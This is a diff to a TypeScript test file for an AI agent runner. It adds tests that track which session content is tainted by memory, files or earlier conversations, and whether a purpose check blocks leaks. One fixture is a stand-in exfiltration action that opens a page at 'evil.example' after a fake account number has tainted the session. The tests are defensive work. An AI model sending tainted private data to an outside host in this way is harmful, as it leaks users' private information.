@@ -43,7 +43,7 @@ afterEach(async () => {
     rmSync(h.home, { recursive: true, force: true });
   }
 });
-function setup(options: { settings?: AgentSettings } = {}) {
+function setup(options: { settings?: AgentSettings; keys?: KeydRecord[] } = {}) {
   const home = mkdtempSync("/tmp/ld-runner-");
   const log = new EventLog(home);
   const live = new LiveSessions();
@@ -51,6 +51,7 @@ function setup(options: { settings?: AgentSettings } = {}) {
     at = "2026-10-02T00:00:00Z";
   const keys: KeydRecord[] = [
     { id: "anthropic", kind: "llm", provider: "anthropic", createdAt: at, updatedAt: at },
+    ...(options.keys ?? []),
   ];
   let settings: AgentSettings = options.settings ?? {
     main: { provider: "anthropic", model: "claude-sonnet-5-5", key: "anthropic" },
@@ -257,6 +258,49 @@ it("an idle upload already registered before followup blocks a replacement until
   }
 });
 
+describe("what the purpose check knows", () => {
+  const leak = [{ kind: "open_page", destination: "evil.example", text: "/c?d=1" }] as const;
+  const signal = new AbortController().signal;
+
+  it("the memory handed to the brain taints the task", async () => {
+    const h = setup();
+    new MemoryStore(h.home).apply(ulid(), "USER.md", "append", "- Banks with Example Bank");
+    const session = await h.runner.start(h.cellId, "Task");
+    await h.ready();
+    expect(session.taint.sources).toEqual([{ kind: "memory", origin: "USER.md" }]);
+  });
+
+  it("asks Jev with a saved Jev key, and nothing judges without one or a fast model", async () => {
+    const at = "2026-10-02T00:00:00Z";
+    const h = setup({
+      keys: [
+        {
+          id: "jev",
+          kind: "http",
+          hosts: ["api.typesafe.ai"],
+          header: "Authorization",
+          format: "bearer",
+          createdAt: at,
+          updatedAt: at,
+        },
+      ],
+    });
+    const ask = vi.fn(async (_secretId: string, _body: unknown, _signal: AbortSignal) => ({
+      answers: { fits: { type: "choice", probabilities: { needed: 0.1, unrelated: 0.9 } } },
+    }));
+    h.deps.jev = ask;
+    const checked = await h.runner.start(h.cellId, "Task");
+    checked.taint.add("files", "~/notes.txt", "Account 4417-1234-5678");
+    expect((await checked.purpose?.check(leak, signal))?.allow).toBe(false);
+    expect(ask).toHaveBeenCalledWith("jev", expect.anything(), expect.any(AbortSignal));
+
+    const plain = setup();
+    const unchecked = await plain.runner.start(plain.cellId, "Task");
+    unchecked.taint.add("files", "~/notes.txt", "Account 4417-1234-5678");
+    expect((await unchecked.purpose?.check(leak, signal))?.allow).toBe(true);
+  });
+});
+
 describe("conversation continuity", () => {
   function conversing() {
     const h = setup();
@@ -288,6 +332,10 @@ describe("conversation continuity", () => {
     expect(h.boots[0]).not.toHaveProperty("earlier");
     expect(h.boots[1]?.earlier).toEqual(["The user: Draw a dog"]);
     expect(h.conversations.current()).toBe(second.id);
+    // What was said before is private, and dot's part of it may repeat what a page said.
+    expect(first.taint.tainted).toBe(false);
+    expect(second.taint.sources).toEqual([{ kind: "recall", origin: "earlier conversation" }]);
+    expect(second.taint.overlap("The user: Draw a dog").overlaps).toBe(true);
   });
 
   it("continues after Stop and after the daemon restarts", async () => {
